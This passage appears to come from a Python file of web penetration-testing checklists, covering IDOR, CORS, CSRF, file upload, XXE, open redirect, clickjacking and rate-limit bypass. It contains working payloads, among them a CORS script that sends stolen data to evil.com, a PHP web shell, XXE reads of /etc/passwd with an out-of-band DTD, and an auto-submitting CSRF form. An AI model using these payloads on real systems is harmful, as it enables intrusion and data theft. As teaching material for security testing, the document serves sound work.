    *   Are session IDs passed in the URL? This is highly insecure as they can be logged or leaked.
4.  **Insecure Transmission of Session Tokens:**
    *   Are session tokens sent over HTTP (instead of HTTPS)?
    *   Are `Secure` and `HttpOnly` flags set for session cookies?
        *   `Secure` flag: Ensures cookie is only sent over HTTPS.
        *   `HttpOnly` flag: Prevents client-side scripts (like XSS) from accessing the cookie.
5.  **Concurrent Sessions:**
    *   Can the same user log in from multiple locations simultaneously? What happens to previous sessions?
    *   Can a user log in from multiple browsers/devices with the same credentials?
6.  **Logout Functionality:**
    *   Does logging out properly invalidate the session on the server-side? (Test by trying to use the old session cookie after logout).
7.  **Session Puzzling:**
    *   Can different session tokens (e.g., from different subdomains or applications sharing the same domain) be used to gain unauthorized access?

## Notes:
*   Always protect session tokens as if they were credentials.
*   Strong random session IDs, proper expiration, and secure flag usage are crucial.
*   Session hijacking can lead to full account compromise.
""",
        },
        "05_Access_Control_Flaws": {
            "01_IDOR.txt": r"""# 05.01 Insecure Direct Object References (IDOR)

## Target: {target_url}

IDORs occur when an application provides direct access to objects based on user-supplied input, without properly validating that the user is authorized to access the requested object.

### Manual Testing Methodology:
1.  **Identify Direct Object References:**
    *   Look for parameters in URLs or POST bodies that directly refer to database IDs or file names:
        *   `?id=123`
        *   `?account_id=456`
        *   `?filename=report.pdf`
        *   JSON/XML: `{"user_id": 789}`
2.  **Test for Horizontal Privilege Escalation:** (Accessing another user's data with the same privilege level)
    *   Log in as `User A`.
    *   Find a resource (e.g., profile, order, message) that belongs to `User A` and has a direct object reference (e.g., `https://example.com/profile?id=A_ID`).
    *   Change the `id` parameter to `B_ID` (the ID of `User B`).
    *   If you can view/modify `User B`'s data, it's a horizontal IDOR.
3.  **Test for Vertical Privilege Escalation:** (Accessing resources of a higher privilege user)
    *   Log in as a low-privileged user (e.g., `User A`).
    *   Identify an object that should only be accessible by an administrator (e.g., `https://example.com/admin/user_settings?id=ADMIN_ID`).
    *   Attempt to access this resource. If successful, it's a vertical IDOR.
4.  **Test for Mass Assignment/Parameter Tampering:**
    *   When updating a user profile, intercept the request.
    *   Try adding parameters that are not normally sent but might exist on the backend (e.g., `is_admin=true`, `role=admin`, `price=0`).
    *   `{"username": "test", "email": "test@test.com", "is_admin": true}`
5.  **Batch Operations:**
    *   If an API endpoint allows batch operations (e.g., deleting multiple items), try manipulating the list of IDs to affect unauthorized items.
    *   `POST /delete_items` with `ids=[1,2,3]` -> change to `ids=[1,2,3,UNAUTHORIZED_ID]`
6.  **Referer Header Manipulation:**
    *   Sometimes, access control checks rely on the `Referer` header. Try to bypass by removing or spoofing it.

## Notes:
*   IDORs are very common and can lead to serious data breaches or unauthorized actions.
*   Always test for authorization checks on *every* request that involves an object ID.
*   Don't just look for numeric IDs; consider UUIDs, filenames, and other unique identifiers.
""",
            "02_Broken_Access_Control.txt": r"""# 05.02 Broken Access Control - General Flaws

## Target: {target_url}

Broken Access Control refers to flaws in how an application restricts what authenticated users are allowed to do.

### Manual Testing Methodology:
1.  **URL Manipulation:**
    *   Try changing the URL path to access restricted functionalities:
        *   `/user/settings` to `/admin/settings`
        *   `/view_item?id=123` to `/edit_item?id=123`
        *   `/api/v1/users` to `/api/v1/admin/users`
    *   Remove path components: `/admin/dashboard/view` to `/admin/dashboard` or `/admin`.
2.  **HTTP Method Tampering:**
    *   If an endpoint only allows `GET` for viewing, try changing the method to `POST`, `PUT`, `DELETE` to perform unauthorized actions.
    *   Example: A `GET /api/v1/user/123` might return user data. Try `PUT /api/v1/user/123` with a JSON body to update it without proper authorization.
3.  **Parameter Tampering:**
    *   Modify parameters related to user roles, permissions, or pricing:
        *   `role=user` to `role=admin`
        *   `price=100` to `price=0`
        *   `approved=false` to `approved=true`
4.  **Client-Side Controls:**
    *   Disable JavaScript in your browser.
    *   Intercept requests with Burp Suite and bypass client-side validation (e.g., disabled buttons, hidden fields).
    *   Modify hidden form fields that control access.
5.  **File/Directory Access Controls:**
    *   Try to access sensitive files directly (e.g., configuration files, logs, backup files):
        *   `{target_url}/.git/config`
        *   `{target_url}/WEB-INF/web.xml`
        *   `{target_url}/database.sql.bak`
    *   Look for directory listings.
6.  **Function Level Access Control:**
    *   Identify functions that should only be available to certain roles (e.g., "delete user", "change password of others", "approve transaction").
    *   Attempt to call these functions as a lower-privileged user.
7.  **API Access Control:**
    *   Test all API endpoints (GET, POST, PUT, DELETE) with different user roles and unauthenticated requests to ensure proper authorization is enforced.
    *   Look for missing authorization headers or weak JWT validation.

## Notes:
*   Access control flaws are a broad category and require thorough testing of all application functionalities.
*   Always test with different user accounts (unauthenticated, low-privileged, high-privileged) to cover all scenarios.
*   This is often combined with IDORs for maximum impact.
""",
        },
        "06_Security_Misconfigurations": {
            "01_Security_Misconfigurations_General.txt": r"""# 06.01 Security Misconfigurations - General

## Target: {target_url}

Security misconfigurations are common and can expose sensitive information or provide attack vectors.

### Manual Testing Methodology:
1.  **Default Credentials/Configuration:**
    *   Check for default passwords on databases, admin panels, network devices.
    *   Search online for default configurations for specific software/frameworks.
2.  **Unpatched Systems/Software:**
    *   Identify versions of web servers (Apache, Nginx, IIS), application servers (Tomcat, JBoss), databases, and frameworks.
    *   Search CVE databases (e.g., NVD, Exploit-DB) for known vulnerabilities in those versions.
    *   **Tools:** Nmap (`-sV` for version detection), `whatweb`.
3.  **Directory Listings:**
    *   Attempt to browse common directories (e.g., `/uploads`, `/images`, `/backup`, `/logs`, `/admin`).
    *   If directory listing is enabled, it can reveal sensitive files.
4.  **Error Handling:**
    *   Trigger various errors (e.g., invalid input, non-existent pages, SQL errors) to see if verbose error messages are displayed.
    *   Verbose errors can leak database schemas, file paths, or internal system details.
5.  **HTTP Headers:**
    *   Analyze security-related HTTP headers:
        *   `Strict-Transport-Security (HSTS)`: Ensures HTTPS-only communication.
        *   `Content-Security-Policy (CSP)`: Mitigates XSS.
        *   `X-Content-Type-Options`: Prevents MIME-sniffing.
        *   `X-Frame-Options`: Prevents clickjacking.
        *   `Feature-Policy` / `Permissions-Policy`: Controls browser features.
    *   **Tools:** Burp Suite, online header checkers.
6.  **Unnecessary Services/Features:**
    *   Are any unnecessary ports open or services running (e.g., FTP, Telnet, old admin interfaces)?
    *   Are debug functionalities enabled in production? (e.g., `/debug`, `/console`).
7.  **Cloud Misconfigurations:** (Covered in Reconnaissance, but re-iterate importance)
    *   Public S3 buckets, misconfigured IAM roles, exposed API keys.
8.  **File Permissions:**
    *   Look for weak file permissions on server-side files (e.g., world-writable directories).
    *   This is harder to test remotely but can be inferred from other vulnerabilities.

## Notes:
*   Misconfigurations can be found in almost any layer of the application stack.
*   Always check development/testing environments for misconfigurations before targeting production.
*   Automated scanners can help identify some misconfigurations, but manual review is crucial.
""",
            "02_CORS_Misconfiguration.txt": r"""# 06.02 CORS Misconfiguration

## Target: {target_url}

Cross-Origin Resource Sharing (CORS) misconfigurations can allow attackers to read sensitive data from other origins.

### Manual Testing Methodology:
1.  **Identify CORS Enabled Endpoints:**
    *   Look for requests that return an `Access-Control-Allow-Origin` header in the response.
    *   This header specifies which origins are allowed to access the resource.
2.  **Test for Reflected Origin:**
    *   Send a request to an endpoint with a custom `Origin` header (e.g., `Origin: http://evil.com`).
    *   If the response includes `Access-Control-Allow-Origin: http://evil.com` and `Access-Control-Allow-Credentials: true`, then the misconfiguration exists.
    *   This allows `evil.com` to make authenticated requests and read the response.
3.  **Test for Null Origin:**
    *   Some applications allow a "null" origin (e.g., for local files or sandboxed iframes).
    *   Send `Origin: null` and check the response.
4.  **Test for Subdomain Wildcard:**
    *   If `Access-Control-Allow-Origin: *.example.com`, try `Origin: http://evil.example.com` or `Origin: http://example.com.evil.com`.
5.  **Test for Internal/Whitelisted Domain Bypass:**
    *   If the application whitelists specific domains (e.g., `example.com`), try to bypass by adding a malicious subdomain or using a typo.
    *   `Origin: https://example.com.evil.com`
    *   `Origin: https://example.com%00.evil.com` (Null byte bypass)
    *   `Origin: https://evil.com` (if `example.com` is expected, try without it)

### Exploitation Scenario:
*   If a reflected origin is found with `Access-Control-Allow-Credentials: true`, an attacker can host a malicious page on `evil.com`:
    ```html
    <!-- on [http://evil.com/xss.html](http://evil.com/xss.html) -->
    <script>
        fetch('https://{target_url}/sensitive_data', {credentials: 'include'})
            .then(response => response.text())
            .then(data => {
                // Send stolen data to attacker's server
                fetch('[http://evil.com/log?data=](http://evil.com/log?data=)' + encodeURIComponent(data));
            });
    </script>
    ```

## Notes:
*   CORS misconfigurations can lead to sensitive data disclosure.
*   Always check for `Access-Control-Allow-Credentials: true` as this is required for authenticated requests.
*   This vulnerability is often overlooked.
""",
        },
        "07_Sensitive_Data_Exposure": {
            "01_Sensitive_Data_Exposure_General.txt": r"""# 07.01 Sensitive Data Exposure - General

## Target: {target_url}

Sensitive data exposure occurs when an application fails to properly protect sensitive information, leading to its disclosure.

### Manual Testing Methodology:
1.  **Unencrypted Data Transmission:**
    *   Check if sensitive data (passwords, credit card numbers, PII) is transmitted over HTTP instead of HTTPS.
    *   Use Burp Suite to inspect requests and responses.
2.  **Weak Encryption/Hashing:**
    *   If encryption is used, identify the algorithms. Look for weak or outdated algorithms (e.g., MD5 for passwords, DES).
    *   Check for lack of salting in password hashes.
3.  **Information Disclosure in Error Messages:**
    *   Trigger various errors (invalid input, non-existent pages, server errors) to see if verbose error messages leak sensitive information (stack traces, database details, file paths, internal IP addresses).
    *   **Example:** SQL error messages disclosing table names or column names.
4.  **Sensitive Data in URLs/Parameters:**
    *   Check if sensitive data is passed directly in URL parameters (e.g., `?password=secret`, `?ssn=123`). This is prone to logging and leakage.
5.  **Backup Files/Configuration Files:**
    *   Look for exposed backup files (`.bak`, `.old`, `.zip`, `.tar.gz`, `.sql`) or configuration files (`.env`, `web.config`).
    *   **Tools:** Dirsearch, Gobuster.
6.  **Hardcoded Credentials/API Keys:**
    *   Examine JavaScript files (as in Reconnaissance), client-side code, or publicly accessible configuration files for hardcoded credentials, API keys, or tokens.
    *   **Tools:** `grep`, manual code review.
7.  **Publicly Accessible Storage:**
    *   Check for misconfigured cloud storage buckets (S3, Azure Blob, Google Cloud Storage) that are publicly readable or writable.
    *   Look for user uploads, backups, logs, or other sensitive files.
8.  **Lack of Data Masking/Redaction:**
    *   Does the application display full credit card numbers, SSNs, or other sensitive data when only partial display is necessary?
    *   Example: Displaying `**** **** **** 1234` instead of the full number.
9.  **Weak File Permissions:**
    *   (Harder to test remotely) If a file inclusion vulnerability is found, try to read sensitive files like `/etc/passwd`, `/etc/shadow`, database configuration files.

## Notes:
*   Sensitive data exposure can lead to identity theft, financial fraud, and further system compromise.
*   Always prioritize encrypted communication (HTTPS) and strong, up-to-date cryptographic practices.
*   Review all data handling practices, from input to storage to output.
""",
            "02_Information_Disclosure.txt": r"""# 07.02 Information Disclosure

## Target: {target_url}

Information disclosure refers to the unintentional revelation of sensitive information about an organization or its systems.

### Manual Testing Methodology:
1.  **Server Banners & Version Information:**
    *   Check HTTP response headers (`Server`, `X-Powered-By`) for server software and version numbers.
    *   Identify versions of web servers, application servers, and frameworks.
    *   **Tools:** Nmap, `curl -I`, `whatweb`.
2.  **Comments in Source Code:**
    *   View the source code of web pages (HTML, CSS, JS) for developer comments that might contain sensitive information (TODOs, credentials, internal URLs, debugging info).
3.  **Exposed API Endpoints/Documentation:**
    *   Look for `/api/docs`, `/swagger-ui.html`, `/redoc`, `/graphql` endpoints that might expose API documentation with sensitive endpoint details or internal logic.
4.  **User Enumeration:**
    *   Can you determine valid usernames by observing different error messages (e.g., "Username not found" vs. "Incorrect password") during login or password reset?
5.  **Internal IP Addresses/Hostnames:**
    *   Look for internal IP addresses or hostnames in error messages, HTTP headers, redirects, or DNS records.
    *   This can map out the internal network.
6.  **Configuration Files/Logs:**
    *   As mentioned in Reconnaissance/Misconfigurations, look for exposed `.env` files, `web.config`, `log` files that can contain credentials, API keys, or internal paths.
7.  **Backup/Temporary Files:**
    *   Look for files like `index.php.bak`, `config.php~`, `report.pdf.old`, `temp.zip` that might contain previous versions or sensitive data.
8.  **Hidden Fields in HTML:**
    *   Inspect HTML source for hidden input fields that might contain sensitive pre-filled data or internal identifiers.
9.  **Open Source Intelligence (OSINT):**
    *   Search public repositories (GitHub), Pastebin, Google, Shodan for mentions of the target domain or company name, looking for leaked credentials, API keys, or internal documents.
    *   **Tools:** Google Dorking.

## Notes:
*   Even seemingly minor pieces of information can be chained together to aid in more serious attacks.
*   Always aim to minimize the amount of information exposed to the public.
*   Automated tools can help, but manual review and OSINT are often more effective for deep information disclosure.
""",
        },
        "08_CSRF_Testing": {
            "01_CSRF_Testing.txt": r"""# 08.01 Cross-Site Request Forgery (CSRF)

## Target: {target_url}

CSRF (also known as XSRF) is an attack that forces an end-user to execute unwanted actions on a web application in which they are currently authenticated.

### Manual Testing Methodology:
1.  **Identify State-Changing Actions:**
    *   Look for functionalities that change the user's state or data:
        *   Change password, change email, update profile, add/delete items, transfer funds, make purchases, submit forms.
    *   These are usually `POST` requests, but can sometimes be `GET` requests (which is a severe misconfiguration).
2.  **Check for Anti-CSRF Tokens:**
    *   Intercept the request for the state-changing action using Burp Suite.
    *   Look for a hidden parameter (e.g., `csrf_token`, `_token`, `authenticity_token`) in the request.
    *   This token should be unique per session/request.
3.  **Test for Token Validation Bypass:**
    *   **Missing Token:** Remove the CSRF token parameter entirely from the request and resubmit. If it succeeds, it's vulnerable.
    *   **Invalid Token:** Change the token to a random value (e.g., `123`, `test`) or an empty string and resubmit. If it succeeds, it's vulnerable.
    *   **Reusable Token:** Capture a token from one request, perform the action, then try to reuse the *same* token for another request. If it works, the token is not properly invalidated after use.
    *   **Session-Independent Token:** Capture a token while logged in as `User A`. Log out, log in as `User B`, then try to use `User A`'s token for `User B`'s action. If it works, the token isn't tied to the user's session.
    *   **Referer Header Check Bypass:** Some applications rely on checking the `Referer` header instead of a token. Try to remove or spoof the `Referer` header. This is a weak defense.
4.  **GET-Based CSRF:**
    *   If a state-changing action can be performed via a `GET` request, it is highly vulnerable to CSRF.
    *   Example: `GET /transfer?amount=100&to=attacker`
    *   An attacker can embed this URL in an `<img>` tag or `<iframe>` on a malicious site.

### Exploitation Scenario (Example - Change Email):
*   Assume the vulnerable request is:
    `POST /change_email HTTP/1.1`
    `Host: {target_url_domain}`
    `Cookie: sessionid=ABCD`
    `Content-Type: application/x-www-form-urlencoded`
    `Content-Length: 30`

    `email=attacker@evil.com&csrf_token=VALID_TOKEN`

*   If no CSRF token or weak validation:
    ```html
    <!-- on [http://evil.com/csrf_attack.html](http://evil.com/csrf_attack.html) -->
    <html>
      <body>
        <form action="https://{target_url_domain}/change_email" method="POST">
          <input type="hidden" name="email" value="attacker@evil.com" />
          <!-- If token is not required or can be bypassed, no token needed -->
          <input type="submit" value="Click me!" />
        </form>
        <script>
          document.forms.submit(); // Auto-submit the form
        </script>
      </body>
    </html>
    ```

## Notes:
*   CSRF can lead to unauthorized actions being performed on behalf of the victim.
*   Always test for CSRF tokens on all sensitive POST requests.
*   The `SameSite` cookie attribute can mitigate some CSRF attacks but is not a complete defense.
""",
        },
        "09_File_Upload_XXE": {
            "01_File_Upload_Vulnerabilities.txt": r"""# 09.01 File Upload Vulnerabilities

## Target: {target_url}

File upload vulnerabilities allow an attacker to upload malicious files (e.g., web shells, malware) to the server.

### Manual Testing Methodology:
1.  **Identify File Upload Functionality:**
    *   Profile pictures, document uploads, report submissions, avatar changes.
2.  **Bypass Client-Side Validation:**
    *   Client-side checks (JavaScript) can often be bypassed by disabling JavaScript or intercepting the request with Burp Suite and modifying the filename/MIME type.
3.  **Bypass Server-Side Validation:**
    *   **MIME Type Bypass:**
        *   Change `Content-Type: image/jpeg` to `Content-Type: image/gif` or `image/png` (if only JPG is allowed).
        *   Try `Content-Type: application/x-php` or `text/php` for PHP files.
    *   **Extension Bypass:**
        *   **Double Extension:** `shell.php.jpg` (if `.jpg` is whitelisted, server might process `.php` first).
        *   **Null Byte:** `shell.php%00.jpg` (for older PHP versions, server might truncate at null byte).
        *   **Case Sensitivity:** `shell.PHP`, `shell.pHp`.
        *   **Alternate Extensions:** `shell.phtml`, `shell.phar`, `shell.asp;`, `shell.aspx`, `shell.jsp`, `shell.cgi`.
        *   **Apache .htaccess Bypass:** Upload a `.htaccess` file that allows PHP execution in a `.jpg` file:
            ```
            <FilesMatch "\.jpg$">
                SetHandler application/x-httpd-php
            </FilesMatch>
            ```
            Then upload `shell.jpg` containing PHP code.
    *   **Magic Byte Bypass:**
        *   Add magic bytes of a legitimate file type (e.g., `GIF89a;`) to the beginning of your malicious file.
        *   `GIF89a;<?php system('id'); ?>`
    *   **Image Metadata Bypass (ExifTool):**
        *   Embed malicious code into image metadata using `exiftool`.
        *   If the application processes image metadata, it might execute the code.
4.  **Path Traversal/Directory Manipulation:**
    *   Try to upload files to arbitrary locations using path traversal: `../../../../var/www/html/shell.php` in the filename.
5.  **Race Conditions:**
    *   If the application uploads a file, then validates/renames it, there might be a small window to execute the malicious file before it's removed or renamed.
    *   Upload a shell, then immediately send requests to execute it.

### Exploitation Scenario (Web Shell):
*   Upload a simple PHP web shell: `<?php system($_GET['cmd']); ?>` as `shell.php`.
*   If successful, access it at `{target_url}/uploads/shell.php?cmd=id`
*   This can lead to Remote Code Execution (RCE).

## Notes:
*   File upload vulnerabilities are often high-impact, leading to RCE or DoS.
*   Always test all forms of validation (client-side, MIME type, extension, content, size).
*   Understand the server environment (Apache, Nginx, IIS, PHP, ASP.NET, Java) to craft effective payloads.
""",
            "02_XXE_External_Entities.txt": r"""# 09.02 XML External Entity (XXE) Injection

## Target: {target_url}

XXE injection allows an attacker to interfere with an application's processing of XML data. It can allow reading arbitrary files, SSRF, or RCE.

### Manual Testing Methodology:
1.  **Identify XML Input Points:**
    *   Look for requests where the `Content-Type` header is `application/xml` or `text/xml`.
    *   SOAP requests, SAML requests, or any functionality that processes XML data.
2.  **Test for Basic XXE (File Disclosure):**
    *   Inject an external entity to read a local file:
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <stockCheck><productId>&xxe;</productId></stockCheck>
        ```
    *   Look for the content of `/etc/passwd` in the application's response.
3.  **Test for Blind XXE (Out-of-Band Interaction):**
    *   If the application doesn't return the file content directly, try to trigger an out-of-band interaction (e.g., via DNS or HTTP request to your collaborator server).
    *   **External DTD with Parameter Entity:**
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY % xxe SYSTEM "http://your_collaborator_server/evil.dtd">
          %xxe;
          %remote;
        ]>
        <stockCheck><productId>&result;</productId></stockCheck>
        ```
        And your `evil.dtd` on `your_collaborator_server`:
        ```dtd
        <!ENTITY % payload SYSTEM "file:///etc/passwd">
        <!ENTITY % remote "<!ENTITY result '%payload;'>">
        ```
    *   This will cause the server to fetch `evil.dtd`, then `evil.dtd` will cause it to fetch `/etc/passwd` and include its content in the `result` entity, which is then sent back to the application. If the app displays `result`, you'll see the file. If not, you might see DNS/HTTP requests to your server.
4.  **Test for SSRF via XXE:**
    *   Use an external entity to make requests to internal services:
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "[http://127.0.0.1:8080/admin](http://127.0.0.1:8080/admin)"> ]>
        <stockCheck><productId>&xxe;</productId></stockCheck>
        ```
    *   Look for responses from internal services.
5.  **Test for RCE via XXE (with PHP expect wrapper):**
    *   If PHP `expect` module is enabled (rare):
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
        <stockCheck><productId>&xxe;</productId></stockCheck>
        ```

## Notes:
*   XXE can lead to sensitive data disclosure, SSRF, and in rare cases, RCE.
*   Always test all XML input points.
*   Use Burp Suite's Collaborator client to detect blind XXE.
*   Pay attention to how XML parsing is configured on the server.
""",
        },
        "10_Business_Logic_Flaws": {
            "01_Business_Logic_Flaws_General.txt": r"""# 10.01 Business Logic Flaws - General

## Target: {target_url}

Business logic flaws are vulnerabilities caused by incorrect implementation of the application's business rules. They are often unique to each application.

### Manual Testing Methodology:
1.  **Understand the Business Logic:**
    *   Thoroughly map out the application's intended functionality and workflows.
    *   Document how features are supposed to work.
2.  **Test for Process Bypass/Circumvention:**
    *   Can you skip steps in a multi-step process (e.g., skip payment in an e-commerce checkout)?
    *   Can you access a function directly without completing prerequisites?
3.  **Parameter Tampering for Price/Quantity Manipulation:**
    *   In e-commerce applications, modify `price`, `quantity`, `discount` parameters in requests.
    *   Example: Buy an item for $100. Intercept the request, change `price=100` to `price=1`.
    *   Can you use negative quantities or prices?
4.  **Insufficient Authorization/Privilege Escalation (Logic-based):**
    *   Can a regular user perform admin actions by simply guessing an API endpoint or manipulating a request parameter, even if no direct IDOR is present?
    *   Example: Changing `user_role=standard` to `user_role=admin` in a profile update request.
5.  **Race Conditions:**
    *   If an application performs a check, then an action (e.g., "check balance, then withdraw"), can you send multiple requests simultaneously to bypass the check?
    *   Example: Sending two withdrawal requests for $50 from an account with $75 balance, hoping both go through before the balance is updated.
    *   **Tools:** Burp Suite Intruder (Sniper/Battering Ram attacks for concurrency).
6.  **Trusting Client-Side Input:**
    *   The application should never trust data sent from the client. All validation should be server-side.
    *   Bypass client-side JavaScript validation (e.g., disabled buttons, input masks).
7.  **Abuse of Functionality:**
    *   Can a feature be used in an unintended way to cause harm?
    *   Example: Using a "report user" feature to spam an admin or trigger a DoS.
8.  **Weak Anti-Fraud Controls:**
    *   Can you create multiple accounts with the same email (with slight variations)?
    *   Can you bypass payment processing limits?
9.  **API Logic Flaws:**
    *   Test API endpoints for business logic issues, as APIs often expose raw functionality.
    *   Are all required parameters truly required? What happens if you omit them?

## Notes:
*   Business logic flaws are often hard to detect with automated scanners and require deep manual understanding.
*   Think like a fraudster or a disgruntled employee trying to abuse the system.
*   Document the entire workflow and any assumptions made by the application.
""",
        },
        "11_API_Security_Testing": {
            "01_API_Security_Testing_General.txt": r"""# 11.01 API Security Testing - General

## Target: {target_url}

API security testing focuses on vulnerabilities within RESTful, SOAP, GraphQL, or other API endpoints.

### Manual Testing Methodology:
1.  **Understand the API:**
    *   Look for API documentation (e.g., Swagger/OpenAPI, Postman collections).
    *   Intercept all API requests with Burp Suite to understand their structure and parameters.
2.  **Broken Object Level Authorization (BOLA / IDOR for APIs):**
    *   Test if you can access or modify objects (e.g., user profiles, orders) that you are not authorized for by changing IDs in API endpoints.
    *   Example: `GET /api/v1/users/123` -> change `123` to `124`.
3.  **Broken User Authentication:**
    *   Test API login endpoints for weak password policies, brute-force vulnerabilities, or insecure token generation.
    *   Are API keys/tokens properly protected and rotated?
4.  **Broken Function Level Authorization (BFLA):**
    *   Test if lower-privileged users can access high-privileged API endpoints by simply calling them directly.
    *   Example: A normal user calling `POST /api/v1/admin/delete_user`.
5.  **Excessive Data Exposure:**
    *   Does the API return more data than necessary (e.g., user hashes, internal IDs, sensitive configuration)?
    *   Filter responses for sensitive information.
6.  **Lack of Resources & Rate Limiting:**
    *   Test if API endpoints are vulnerable to brute-force attacks or denial-of-service by sending many requests.
    *   Look for missing rate limiting on login, password reset, or resource-intensive endpoints.
7.  **Mass Assignment:**
    *   When updating objects via API (e.g., `PUT /api/v1/users/123`), try to inject additional parameters that might be processed by the backend (e.g., `is_admin: true`, `role: admin`).
8.  **Injection Flaws:**
    *   Test all API parameters (in URL, JSON body, headers) for SQLi, Command Injection, XXE (if XML is used).
9.  **Improper Assets Management:**
    *   Look for old, unversioned, or deprecated API endpoints (e.g., `/api/v1`, `/api/v2`, `/api/old`). These might have known vulnerabilities or weaker security.
10. **Insecure API Key Usage:**
    *   Are API keys hardcoded in client-side code?
    *   Are they restricted to specific IP addresses or domains?
    *   Are they used for client-side functionality when they should be server-side?

## Notes:
*   APIs are a rich source of vulnerabilities, as they expose the raw logic of the application.
*   Treat API endpoints as separate applications and apply all relevant web vulnerability tests.
*   Use tools like Postman, Insomnia, or Burp Suite for efficient API testing.
""",
        },
        "12_Other_Vulnerabilities": {
            "01_Open_Redirect.txt": r"""# 12.01 Open Redirect

## Target: {target_url}

Open redirect vulnerabilities occur when an application redirects users to a URL specified in a parameter, without proper validation.

### Manual Testing Methodology:
1.  **Identify Redirection Points:**
    *   Look for parameters in URLs that control redirects: `?next=`, `?url=`, `?redirect=`, `?continue=`, `?return_to=`.
    *   Common after login, logout, or form submissions.
2.  **Test for Simple Redirect:**
    *   Modify the parameter to an external malicious URL:
        *   `{target_url}/login?next=http://evil.com`
        *   `{target_url}/redirect?url=https://phishing.example.com`
    *   If the application redirects to the external URL, it's vulnerable.
3.  **Bypassing Filters:**
    *   **URL Encoding:** Double URL encode the payload.
    *   **Path Traversal:** `{target_url}/redirect?url=/../evil.com`
    *   **Null Byte:** `{target_url}/redirect?url=evil.com%00.example.com`
    *   **Whitelisted Domain Bypass:**
        *   If `example.com` is whitelisted, try `example.com.evil.com` or `evil.com/example.com`.
        *   `{target_url}/redirect?url=https://example.com@evil.com` (URL parsing tricks)
        *   `{target_url}/redirect?url=https://example.com%252f%252f%252f.evil.com` (Double encoding bypass)
    *   **Fragment (`#`) Bypass:** Some applications only check before the fragment.
        *   `{target_url}/redirect?url=https://example.com#evil.com`
        *   `{target_url}/redirect?url=https://evil.com%23example.com`
    *   **Backslashes:** `{target_url}/redirect?url=https://evil.com\` (if server-side processing allows it).

### Exploitation Scenario (Phishing):
*   An attacker can craft a malicious link: `https://{target_url}/login?next=https://phishing.example.com`
*   The victim clicks the link, is redirected through the legitimate domain, and lands on the phishing site, which looks more credible.

## Notes:
*   Open redirects are commonly used in phishing attacks.
*   Always validate redirection targets against a whitelist of allowed domains.
*   Ensure the validation is done server-side.
""",
            "02_Clickjacking.txt": r"""# 12.02 Clickjacking

## Target: {target_url}

Clickjacking (UI redressing) is an attack where an attacker tricks a user into clicking on something different from what the user perceives, by overlaying a malicious transparent iframe.

### Manual Testing Methodology:
1.  **Identify Sensitive Actions:**
    *   Look for actions that, if performed by a user unknowingly, would be impactful:
        *   Making purchases, transferring funds, changing passwords, deleting accounts, authorizing applications.
2.  **Test for `X-Frame-Options` Header:**
    *   Send a request to the sensitive page and check the HTTP response headers for `X-Frame-Options`.
    *   **Headers to look for:**
        *   `X-Frame-Options: DENY` (most secure)
        *   `X-Frame-Options: SAMEORIGIN` (allows framing by same-origin pages)
        *   `X-Frame-Options: ALLOW-FROM https://trusted.com` (allows framing by specific origin)
    *   If the header is missing or misconfigured, the page is potentially vulnerable.
3.  **Test with a Simple HTML Page:**
    *   Create a simple HTML page on an attacker-controlled domain (`evil.com`):
        ```html
        <!-- on [http://evil.com/clickjack.html](http://evil.com/clickjack.html) -->
        <head>
            <style>
                iframe {{
                    position:relative;
                    width: 1000px;
                    height: 1000px;
                    opacity: 0.00001; /* Make it transparent */
                    z-index: 2;
                    left: -500px; /* Adjust to position correctly */
                    top: -500px;
                }}
                div {{
                    position:absolute;
                    top:550px; /* Position the decoy button */
                    left:550px;
                    z-index: 1;
                }}
            </style>
        </head>
        <body>
            <div>Click here for a free iPhone!</div>
            <iframe src="https://{target_url_domain}/sensitive_action_page"></iframe>
        </body>
        ```
    *   Load this page in a browser and try to position the transparent iframe over the "Click here for a free iPhone!" button to align with a sensitive button on the target page (e.g., "Confirm Purchase").
4.  **Content Security Policy (CSP) Frame-Ancestors:**
    *   If `X-Frame-Options` is missing, check the `Content-Security-Policy` header for `frame-ancestors` directive.
    *   `Content-Security-Policy: frame-ancestors 'self' https://trusted.com;`
    *   If `frame-ancestors` is missing or configured loosely, the page is vulnerable.

### Exploitation Scenario:
*   An attacker overlays a transparent malicious iframe over a legitimate website.
*   The user thinks they are clicking a button on the attacker's site (e.g., "Win a free gift") but is actually clicking a button on the hidden legitimate site (e.g., "Confirm purchase of $1000").

## Notes:
*   Clickjacking can lead to unauthorized actions, account compromise, or data theft.
*   Always implement `X-Frame-Options: DENY` or a strict `Content-Security-Policy` with `frame-ancestors` directive for all sensitive pages.
*   Modern browsers have some built-in protections, but proper server-side headers are essential.
""",
            "03_Rate_Limiting_Bypass.txt": r"""# 12.03 Rate Limiting Bypass

## Target: {target_url}

Rate limiting is crucial to prevent brute-force attacks and resource exhaustion. Bypassing it can lead to credential stuffing, account lockout, or DoS.

### Manual Testing Methodology:
1.  **Identify Rate-Limited Endpoints:**
    *   Login pages, password reset, OTP/MFA verification, API endpoints, search functions, comment submissions.
    *   Attempt to send multiple requests rapidly to trigger rate limiting (e.g., 5-10 requests in quick succession).
    *   Look for error messages like "Too many requests," "Rate limit exceeded," or temporary IP bans.
2.  **Bypassing IP-Based Rate Limiting:**
    *   **X-Forwarded-For Header:** Add or cycle through `X-Forwarded-For` headers with different IP addresses:
        *   `X-Forwarded-For: 1.1.1.1`
        *   `X-Forwarded-For: 2.2.2.2`
        *   `X-Originating-IP`, `X-Remote-IP`, `X-Remote-Addr`
    *   **Using a Proxy Chain/VPN/Tor:** Distribute requests through multiple IPs.
    *   **Adding Null Bytes/Whitespace:** `X-Forwarded-For: 1.1.1.1%00` or `X-Forwarded-For: 1.1.1.1 `
3.  **Bypassing User-Based Rate Limiting (Session/Cookie):**
    *   **Invalidating Session/Cookie:** If rate limiting is tied to a session cookie, try to use a new session for each request (e.g., delete cookies or use Burp Intruder's "Null payloads" for cookies).
    *   **Cycling Usernames/Emails:** For login brute-forcing, instead of attacking one user, try to cycle through a list of usernames and attempt one password per user, then repeat. This can evade per-user rate limiting.
4.  **Bypassing Parameter-Based Rate Limiting:**
    *   **Adding Random Parameters:** Add a random, unused parameter to each request to make it appear unique:
        *   `POST /login` with `username=user&password=pass&random=123`
        *   `POST /login` with `username=user&password=pass&random=456`
    *   **Changing Case/Encoding:** Modify the case of parameters or URL encode parts of the request.
